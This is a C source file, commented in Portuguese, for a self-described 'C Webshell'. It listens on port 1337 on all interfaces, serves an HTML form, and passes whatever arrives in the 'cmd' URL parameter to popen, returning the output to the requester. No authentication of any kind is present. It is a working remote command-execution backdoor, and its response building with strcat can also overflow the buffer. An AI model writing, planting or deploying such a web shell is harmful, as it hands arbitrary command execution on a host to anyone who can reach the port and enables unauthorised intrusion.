#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 1337
#define BUFFER_SIZE 4096

int server_socket(){
    int sockfd;
    struct sockaddr_in server_addr;

    //criar socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        exit(EXIT_FAILURE);
    }

    // Permitir reusar porta (evita erro "Address already in use")
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));


    //configurar endereco do servidor
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    //bindar o socket com o endereco do servidor
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0){
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    //colocar em modo escuta
    if (listen(sockfd, 1) < 0){
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    return sockfd; //retorna o socket ja configurado
}

// Função para decodificar URL
void url_decode(char *src, char *dest, size_t dest_size) {
    char *p = src;
    char *d = dest;
    char *end = dest + dest_size - 1;
    
    while (*p && d < end) {
        if (*p == '+') {
            *d++ = ' ';  // Converter + para espaço
        } else if (*p == '%' && p[1] && p[2]) {
            // Converter %XX para caractere
            int hex;
            sscanf(p + 1, "%2x", &hex);
            *d++ = (char)hex;
            p += 2;  // Pular os 2 caracteres hex
        } else {
            *d++ = *p;  // Copiar caractere normal
        }
        p++;
    }
    *d = '\0';
}

void http_handle(int client_sock){
    char buffer[BUFFER_SIZE];
    char response[BUFFER_SIZE * 3]; //response pode ser maior que o request
    char command[256] = {0}; //comando a ser executado
    char decoded_command[256] = {0}; //comando decodificado
    memset(buffer, 0, BUFFER_SIZE); //limpar buffer
    memset(response, 0, BUFFER_SIZE * 3); //limpar response

    //receber request
    recv(client_sock, buffer, BUFFER_SIZE - 1, 0);

    char *cmd_begin = strstr(buffer, "GET /?cmd=");

    if (cmd_begin){
        cmd_begin += strlen("GET /?cmd="); //avancar ponteiro para o inicio do comando
    
        char *cmd_end = strstr(cmd_begin, " HTTP");
        if (cmd_end){
            int len = cmd_end - cmd_begin;
            if (len >= sizeof(command)){
                len = sizeof(command) - 1; //garantir que nao excede o tamanho do buffer
            }
            strncpy(command, cmd_begin, len);
            command[len] = '\0'; //null character para o comando

            url_decode(command, decoded_command, sizeof(decoded_command));
        }
    }

     // Monta resposta HTTP
    strcpy(response, "HTTP/1.1 200 OK\r\n");
    strcat(response, "Content-Type: text/html\r\n");
    strcat(response, "Connection: close\r\n\r\n");
    
    // Interface web básica
    strcat(response, "<html><body>");
    strcat(response, "<h2>C Webshell</h2>");
    strcat(response, "<form method='GET'>");
    strcat(response, "Command: <input type='text' name='cmd' size='50'>");
    strcat(response, "<input type='submit' value='Execute'>");
    strcat(response, "</form><hr>");
    


    if (strlen(decoded_command) > 0){

        strcat(response, "<h3>Comando executado:</h3>");
        strcat(response, "<pre>");
        strcat(response, decoded_command);
        strcat(response, "\nOutput:\n\n");

        FILE *fp = popen(decoded_command, "r");
        if (fp) {
            char output[1024];
            while (fgets(output, sizeof(output), fp)) {
                strcat(response, output);
            }
            int status = pclose(fp);
            if(status != 0){
            strcat(response, "\nErro na execucao do comando.");
            }
        } else {
            strcat(response, "Erro no popen.");
        }

        strcat(response, "</pre>");

    }
    strcat(response, "</body></html>");

    
    send(client_sock, response, strlen(response), 0);

}

int main (int argc, char *argv[]){

    int server_fd, client_fd;

    server_fd = server_socket();
    if (server_fd < 0) return 1;

    if (fork() == 0) {
        while(1){
            client_fd = accept(server_fd, NULL, NULL);

            if(client_fd >= 0){
                http_handle(client_fd);
                close(client_fd);
            }
        }
    }else{
        while(1){
            client_fd = accept(server_fd, NULL, NULL);

            if(client_fd >= 0){
                http_handle(client_fd);
                close(client_fd);
            }
        }
    }
    close(server_fd);
    return 0;
}